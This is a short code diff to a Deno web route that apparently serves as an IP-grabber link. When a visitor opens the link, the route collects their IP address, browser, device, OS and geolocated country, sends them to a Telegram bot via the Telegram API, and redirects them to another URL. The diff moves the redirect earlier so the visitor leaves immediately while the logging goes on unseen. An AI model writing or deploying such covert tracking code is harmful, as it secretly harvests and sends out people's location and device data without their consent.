@@ -12,6 +12,7 @@ router.get("/", async (ctx) => {
   const { browser, device, os } = userAgent(userAgentString);
   
   const ip = ctx.request.ip;
+  ctx.response.redirect(`${Deno.env.get("URL")}`);
   const info = await ipapi(`${ip}`);
   const bot = `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage`
   const countryinfo = `**COUNTRY** : \`${info.country}\`` + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
@@ -49,7 +50,6 @@ router.get("/", async (ctx) => {
   };
    await fetch(bot, button);
 
-  ctx.response.redirect(`${Deno.env.get("URL")}`);
 });
 
 app.use(router.routes());
